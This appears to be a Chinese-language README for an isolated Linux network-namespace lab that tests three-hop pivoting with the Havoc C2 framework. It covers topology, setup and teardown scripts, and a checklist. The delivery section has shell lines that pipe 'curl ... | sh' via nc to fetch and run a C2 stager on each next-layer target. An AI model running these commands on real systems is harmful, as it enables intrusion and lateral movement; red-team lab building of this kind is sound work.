# 隔离三层内网实验（Linux netns）

用于验证 Havoc Web 控制台的「已有会话 → shell 命令 → 一键上线」三层跳板链路，
**完全在本机内核网络命名空间内**，不触碰真实局域网/公网。

> Kali 本身是 VMware 虚拟机且未开启嵌套虚拟化（无 `/dev/kvm`、CPU 未暴露 vmx/svm），
> 因此无法在 guest 内再建 VMnet2/3/4；这里用 netns + veth + 路由实现等价的
> L3 三层拓扑，隔离性与可重复性更好。

## 拓扑

```
Kali 192.168.121.132
  │  hlab-br0 10.10.0.1/24
  ▼
hlab-hop1  10.10.0.2/24  ·  lab1 10.10.10.1/24
  ├── hlab-t1   10.10.10.10/24      ← 第一层目标
  └── hlab-hop2 10.10.10.2/24  ·  lab2 10.10.20.1/24
         ├── hlab-t2  10.10.20.10/24 ← 第二层目标
         └── hlab-hop3 10.10.20.2/24 · lab3 10.10.30.1/24
                └── hlab-t3 10.10.30.10/24 ← 第三层目标
```

| 节点 | lab1 | lab2 | lab3 | 上行 |
| --- | --- | --- | --- | --- |
| hop1 | `10.10.10.1/24`（br1） | — | — | `10.10.0.2/24` → Kali |
| hop2 | `10.10.10.2/24` | `10.10.20.1/24`（br2） | — | 默认 → `10.10.10.1` |
| hop3 | — | `10.10.20.2/24` | `10.10.30.1/24`（br3） | 默认 → `10.10.20.1` |
| t1 | `10.10.10.10/24` | — | — | 默认 → `10.10.10.1` |
| t2 | — | `10.10.20.10/24` | — | 默认 → `10.10.20.1` |
| t3 | — | — | `10.10.30.10/24` | 默认 → `10.10.30.1` |

Kali 侧路由：

```
10.10.10.0/24 via 10.10.0.2 dev hlab-br0
10.10.20.0/24 via 10.10.0.2 dev hlab-br0
10.10.30.0/24 via 10.10.0.2 dev hlab-br0
```

## 启动 / 停止

```bash
cd /home/kali/桌面/Havoc

sudo bash lab/setup_lab.sh      # 创建 netns、veth、路由、execd（:2222）
cat lab/run/verify.txt          # 连通性验收
cat lab/run/lab.json            # 拓扑与投递命令

sudo bash lab/teardown_lab.sh   # 删除实验环境（同时也结束三层目标里的进程）
```

setup 会启动 `lab/execd.py`（仅监听实验网地址 `:2222`），用于模拟“跳板机上的远端执行通道
（SSH/WinRM）”：从上一层的 C2 会话执行一条 `nc` 命令，把一键上线命令送到下一层。
它不是生产组件，随 netns 删除而终止；日志在 `lab/run/execd-t{1,2,3}.log`。

## 三层投递（经已有会话）

前提：`webui`、teamserver、stager（9901）在运行，且有一个健康的 Linux 会话作为入口
（本仓库用 `4c0b4946`，在 Kali 上，sleep 0）。

```text
# 第 1 层：从已有 Kali 会话投递到 10.10.10.10
shell printf '%s\n' 'curl -fsSL http://192.168.121.132:9901/slt | sh' | nc -w 30 10.10.10.10 2222

# 第 2 层：从新上线的 t1 会话投递到 10.10.20.10
shell printf '%s\n' 'curl -fsSL http://192.168.121.132:9901/slt | sh' | nc -w 30 10.10.20.10 2222

# 第 3 层：从新上线的 t2 会话投递到 10.10.30.10
shell printf '%s\n' 'curl -fsSL http://192.168.121.132:9901/slt | sh' | nc -w 30 10.10.30.10 2222
```

每层上线后，`havoc_list_sessions` 应出现 `external_ip` 为对应 `10.10.x.10` 的新会话；
`pivot_parent` 为空、拓扑图上是 teamserver 的直属绿色节点——这与 Havoc 的“网络层跳板”
语义一致（`pivot_parent` 只用于 SMB pivot 这类 agent 内隧道）。三层链路的层级关系体现在
**网络路由**（`ip route get`）与投递路径上，而不是 C2 拓扑边。

## 校验点

1. `Kali → 10.10.10.10/20.10/30.10` 的 `ping` 与 `:2222` 命令通道均通（`verify.txt`）。
2. t1 的会话 shell 能访问 `10.10.20.10:2222`（经 hop1→hop2）。
3. t2 的会话 shell 能访问 `10.10.30.10:2222`（经 hop2→hop3）。
4. t1/t2/t3 的 agent 均回连 `192.168.121.132:8080`，`health=healthy`。
5. 三层链路上 `shell id -un; hostname` 可正常回显（回显来自对应层的命名空间）。

## 清理

```bash
sudo bash lab/teardown_lab.sh
```

删除 netns 会终止其中所有进程（含 execd 与已上线的 Demon），相关 C2 会话随之变为
stale/消失；这是实验环境的预期行为。

实验会话在 Web 拓扑里的“投递链虚线”保存在 `webui/data/delivery_edges.json`，
teardown 不会自动删除。需要清理时：

```bash
# 逐条清除（会话仍存在时）
curl -s -X POST http://127.0.0.1:8081/api/sessions/<child>/delivery-parent \
  -H "Authorization: Bearer $(cat webui/run/mcp.token)" \
  -H 'Content-Type: application/json' -d '{"parent":""}'
# 或直接删除文件（先停 webui）
rm -f webui/data/delivery_edges.json
```
